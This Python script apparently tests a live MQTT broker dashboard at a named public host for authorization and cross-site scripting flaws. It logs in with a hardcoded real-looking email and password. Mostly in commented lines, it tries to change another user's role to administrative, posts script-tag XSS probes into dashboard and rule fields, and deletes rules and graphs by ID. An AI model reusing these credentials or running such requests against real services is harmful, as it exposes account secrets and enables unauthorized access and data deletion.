import requests
import json

session1=requests.Session()
login_res=session1.post("https://publicmqtt.bevywise.com/login/",data={"username":"ssgbs92@gmail.com","password":"@Venkystark77"},headers={'Referer':'https://publicmqtt.bevywise.com/'})
if login_res.ok:
    print("User 1 loged in")
    print(login_res.status_code)
    auth_res=session1.get("https://publicmqtt.bevywise.com/bwiot/api/v1/admin/getUserPermission")
    if auth_res.ok:
        print(auth_res.text)
else:
    print(login_res.status_code)
    print(login_res.text)
# session2=requests.Session()
# login_res=session2.post("https://publicmqtt.bevywise.com/login/",data={"username":"venkateshv2508@gmail.com","password":"@Venkystark77"},headers={'Referer':'https://publicmqtt.bevywise.com/'})
# if login_res.ok:
#     print("User 2 logged in")
#     print(login_res.status_code)
#     auth_res=session2.get("https://publicmqtt.bevywise.com/bwiot/api/v1/admin/getUserPermission")
#     if auth_res.ok:
#         print(auth_res.json())
# else:
#     print(login_res.status_code)
#     print(login_res.text)
#post_res=session2.post("https://publicmqtt.bevywise.com//bwiot/api/v1/admin/userRoleChange",data={"role":"administrative","id":175,"csrfmiddlewaretoken":session2.cookies.get('csrftoken')},headers={'Referer':'https://publicmqtt.bevywise.com/'})
# with open('bevytester\mqtt\\rule.json') as json_file:
#     json_data=json.load(json_file)
# for top_key in json_data: #topKey refers to the top url,sub key is api,inner keys are attack payloads
#             sub_json=json_data[top_key]
#             for sub_key in sub_json:
#                 inner_json=sub_json[sub_key]
#                 for inner_key in inner_json:
#                     if inner_key=="xss_attack":
#                         payload=inner_json[inner_key]
# # print(payload)
# # payload['csrfmiddlewaretoken']=session1.cookies.get('csrftoken') 
# # print(payload)
# payload = {
#     "mq_client": "25",
#     "mq_topic": "0",
#     "msg_chk_type": "with_out_key",
#     "whole_set_condition": "match_all",
#     "check_set": '[]',
#     "check_days": '["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"]',
#     "response_message_type": "send_defined",
#     "forward_mq_client": "<script>console.log('hello');</script>",
#     "forward_mq_topic": "dsf",
#     "forward_mq_message": "dfdf",
#     "queryType": "insert",
#     "ruleId": "0",
#     "send_every_event": "1",
#     "send_once": "0",
#     "snooze_for": "0",
#     "clear_alarm": "0",
#     "clear_alarm_message": "",
#     "csrfmiddlewaretoken":session1.cookies.get('csrftoken')
# }
#post_res=session1.post("https://publicmqtt.bevywise.com/bwiot/api/v1/admin/createDashboard",data={'csrfmiddlewaretoken':session1.cookies.get('csrftoken'),"group_name":"g1","dashboard_name":"<script>alert(\"hello\");</script>","description":"<script>console.log('hello');</script>"},headers={'Referer':'https://publicmqtt.bevywise.com/'})
#post_res=session1.post("https://publicmqtt.bevywise.com/bwiot/api/v1/rule_engine/create_event_rule/device_alert",data=payload,headers={'Referer':'https://publicmqtt.bevywise.com/'})
#post_res=session2.post("https://publicmqtt.bevywise.com/bwiot/api/v1/rule_engine/delete_rule",data={"csrfmiddlewaretoken":session2.cookies.get('csrftoken'),"id":24},headers={'Referer':'https://publicmqtt.bevywise.com/'})
post_res=session1.post("https://publicmqtt.bevywise.com/bwiot/api/v1/graph/deleteMainGraph/",data={'csrfmiddlewaretoken':session1.cookies.get('csrftoken'),'report_id':'UwN0eY4B1mTppEXH1WRs'},headers={'Referer':'https://publicmqtt.bevywise.com/'})
if post_res.ok:
    print("posted")
    print(post_res.status_code)
    print(post_res.text)
else:
    print(post_res.status_code)
    print(post_res.text)